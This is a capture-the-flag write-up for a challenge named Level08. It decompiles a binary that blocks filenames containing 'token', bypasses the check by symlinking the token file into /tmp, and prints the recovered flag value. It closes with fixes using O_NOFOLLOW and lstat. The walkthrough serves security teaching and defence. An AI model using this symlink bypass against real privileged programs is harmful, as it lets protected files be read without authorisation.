# Level08

### Tools


### How to solve it

1. After loging in using ssh in level08@(vmIP):
```
ssh level0@000.000.000.000 -p 4242
```
2. When loging in we get this file:
```
level08
```
3. We check level08 and check that this is an executable so we use Ghidra to get the code:
```

int main(int argc,char **argv,char **envp)

{
  char *pcVar1;
  int __fd;
  size_t __n;
  ssize_t sVar2;
  int in_GS_OFFSET;
  undefined1 local_414 [1024];
  int local_14;

                    /* Unresolved local var: char[1024] buf@[DW_OP_breg4(ESP): +44]
                       Unresolved local var: int fd@[DW_OP_breg4(ESP): +36]
                       Unresolved local var: int rc@[DW_OP_breg4(ESP): +40] */
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  if (argc == 1) {
    printf("%s [file to read]\n",*argv);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  pcVar1 = strstr(argv[1],"token");
  if (pcVar1 != (char *)0x0) {
    printf("You may not access \'%s\'\n",argv[1]);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  __fd = open(argv[1],0);
  if (__fd == -1) {
    err(1,"Unable to open %s",argv[1]);
  }
  __n = read(__fd,local_414,0x400);
  if (__n == 0xffffffff) {
    err(1,"Unable to read fd %d",__fd);
  }
  sVar2 = write(1,local_414,__n);
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return sVar2;
}
```

4. So now we have the information that the program does not accepts token file as argument so we need to bypass this:
```
  pcVar1 = strstr(argv[1],"token");
  if (pcVar1 != (char *)0x0) {
    printf("You may not access \'%s\'\n",argv[1]);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
```
5. To bypass it we create a symlink between the token and a file created on /tmp/ :
```
ln -s /home/user/level08/token /tmp/symlink08
./level08 /tmp/symlink08

```
6. And Vouilá:
```
Check flag.Here is your token : quif5eloekouj29ke0vouxean
```

### How to protect
 - Disallow symlinks completely using this flag: open(argv[1], O_RDONLY | O_NOFOLLOW) or
```
lstat struct stat st;
lstat(argv[1], &st);

if (S_ISLNK(st.st_mode)) {
    printf("Symlinks not allowed\n");
    exit(1);
}
```
